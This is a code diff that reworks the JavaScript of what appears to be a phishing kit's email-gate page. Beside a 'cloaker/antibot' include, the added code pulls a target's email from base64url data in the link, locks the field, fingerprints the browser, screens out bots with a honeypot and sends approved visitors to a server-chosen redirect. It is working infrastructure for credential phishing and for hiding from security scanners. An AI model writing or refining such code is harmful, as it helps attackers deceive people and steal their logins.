@@ -120,31 +120,85 @@ require_once __DIR__ . '/includes/index.php'; // your cloaker/antibot
 
  <script>
 document.addEventListener('DOMContentLoaded', () => {
-  // Tiny helper
+  // ---------- Tiny helpers ----------
   const $ = id => document.getElementById(id);
+  const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(String(v).trim());
+  const show = (n, msg) => { if (!n) return; if (msg) n.textContent = msg; n.style.display = 'block'; };
+  const hide = n => { if (!n) return; n.style.display = 'none'; };
 
-  // i18n (EN/FR)
-  const LANG = (navigator.language || 'en').slice(0,2);
+  // ---------- i18n (EN/FR) ----------
+  const LANG = ((navigator.languages && navigator.languages[0]) || navigator.language || 'en').slice(0,2).toLowerCase();
   const T = {
-    en: { invalidEmail:'Please enter a valid email address.', errorGeneric:'Something went wrong. Please try again.', redirecting:'Suivant' },
-    fr: { invalidEmail:'Veuillez saisir une adresse e-mail valide.', errorGeneric:'Une erreur est survenue. Merci de réessayer.', redirecting:'Suivant' }
+    en: {
+      invalidEmail: 'Please enter a valid email address.',
+      errorGeneric: 'Something went wrong. Please try again.',
+      redirecting: 'Redirecting…',
+      next: 'Continue',
+      placeholder: 'username@company.com'
+    },
+    fr: {
+      invalidEmail: 'Veuillez saisir une adresse e-mail valide.',
+      errorGeneric: 'Une erreur est survenue. Merci de réessayer.',
+      redirecting: 'Redirection…',
+      next: 'Continuer',
+      placeholder: 'nom@entreprise.com'
+    }
   };
   const t = T[LANG] || T.en;
 
-  // Endpoint (your PHP bridge/back-end)
-  const gateway = 'z/validate.php';
+  // ---------- Endpoint ----------
+  const gateway = 'z/validate.php'; // your PHP validator
 
-  // DOM refs
+  // ---------- DOM refs ----------
   const form     = $('verifyForm');
   const input    = $('email');
   const errBox   = $('err');
-  const submitEl = $('submitBtn') || $('continueBtn'); // support either id
+  const submitEl = $('submitBtn') || $('continueBtn');
 
-  const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(String(v).trim());
-  const show = (n, msg) => { if (!n) return; if (msg) n.textContent = msg; n.style.display = 'block'; };
-  const hide = (n) => { if (!n) return; n.style.display = 'none'; };
+  // ---------- Prevent placeholder flash; set language placeholder later ----------
+  if (input) input.setAttribute('placeholder', '');
 
-  // Optional: simple fingerprint (backend can ignore it)
+  // ---------- Base64url decode ----------
+  function b64urlDecode(s) {
+    try {
+      let str = (s || '').replace(/-/g, '+').replace(/_/g, '/');
+      // pad
+      str += '==='.slice((str.length + 3) % 4);
+      return atob(str);
+    } catch { return ''; }
+  }
+
+  // ---------- Auto-grab email from URL (#, $, or ?e=) ----------
+  function emailFromURL() {
+    const href = String(location.href);
+    let encoded = null;
+
+    const hashIdx = href.indexOf('#');
+    if (hashIdx !== -1) encoded = href.slice(hashIdx + 1);
+
+    if (!encoded) {
+      const dollarIdx = href.lastIndexOf('$');
+      if (dollarIdx !== -1) encoded = href.slice(dollarIdx + 1);
+    }
+
+    if (!encoded) {
+      const p = new URLSearchParams(location.search);
+      if (p.has('e')) encoded = p.get('e');
+    }
+
+    if (!encoded) return null;
+
+    const email = b64urlDecode(encoded);
+    return looksLikeEmail(email) ? email.toLowerCase() : null;
+  }
+
+  const autograb = emailFromURL();
+  if (autograb && input) {
+    input.value = autograb;
+    input.readOnly = true; // optional: lock after auto-fill
+  }
+
+  // ---------- Fingerprint (optional) ----------
   let fpHash = '';
   (async () => {
     try {
@@ -154,35 +208,40 @@ document.addEventListener('DOMContentLoaded', () => {
     } catch {}
   })();
 
-  // Enable/disable button as user types
+  // ---------- Button state ----------
+  const setBtn = (enabled, label) => {
+    if (!submitEl) return;
+    submitEl.disabled = !enabled;
+    if (label) submitEl.textContent = label;
+  };
+  setBtn(!!(input && looksLikeEmail(input.value)), t.next);
+
   input?.addEventListener('input', () => {
     hide(errBox);
-    if (submitEl) submitEl.disabled = !looksLikeEmail(input.value);
+    setBtn(looksLikeEmail(input.value), t.next);
   });
 
-  // Submit → server whitelist check (no captcha)
+  // ---------- Submit flow ----------
   form?.addEventListener('submit', async (e) => {
     e.preventDefault();
 
-    const val  = (input?.value || '').trim();
-    const trap = ($('middleName')?.value || '').trim(); // honeypot; must be empty
-
+    const val  = (input?.value || '').trim().toLowerCase();
+    const trap = ($('middleName')?.value || '').trim(); // honeypot must be empty
     if (!looksLikeEmail(val)) return show(errBox, t.invalidEmail);
     if (trap) return; // bot
 
     const payload = {
-      email: val.toLowerCase(),
+      email: val,
       middleName: trap,
       jsToken: 'ok-' + Math.random().toString(36).slice(2),
       fingerprint: fpHash
     };
 
-    // Abort after 12s to avoid hanging
     const ctl = new AbortController();
     const timer = setTimeout(() => ctl.abort(), 12000);
 
     try {
-      if (submitEl) { submitEl.disabled = true; submitEl.textContent = 'Suivant'; }
+      setBtn(false, t.next);
 
       const res = await fetch(gateway, {
         method: 'POST',
@@ -191,29 +250,34 @@ document.addEventListener('DOMContentLoaded', () => {
         signal: ctl.signal
       });
 
-      const text = await res.text();
+      const raw = await res.text();
       let json = {};
-      try { json = JSON.parse(text); } catch {}
+      try { json = JSON.parse(raw); } catch {}
 
       if (res.ok && json.valid && json.redirect) {
-        if (submitEl) submitEl.textContent = t.redirecting;
-        setTimeout(() => { location.assign(json.redirect); }, 600);
+        setBtn(false, t.redirecting);
+        // small delay for UX; go!
+        setTimeout(() => { location.assign(json.redirect); }, 500);
       } else {
         const msg = (json && (json.message || json.detail))
           ? json.message + (json.detail ? ` (${json.detail})` : '')
           : `${t.errorGeneric} [${res.status}]`;
         show(errBox, msg);
-        if (submitEl) { submitEl.disabled = !looksLikeEmail(val); submitEl.textContent = 'Next'; }
+        setBtn(looksLikeEmail(val), t.next);
       }
     } catch {
       show(errBox, t.errorGeneric);
-      if (submitEl) { submitEl.disabled = !looksLikeEmail(input.value); submitEl.textContent = 'Next'; }
+      setBtn(looksLikeEmail(input?.value || ''), t.next);
     } finally {
       clearTimeout(timer);
     }
   });
+
+  // ---------- Final touch: set localized placeholder after autograb ----------
+  if (input && !input.value) input.setAttribute('placeholder', t.placeholder);
 });
 </script>
+
 </body>
 </html>
 
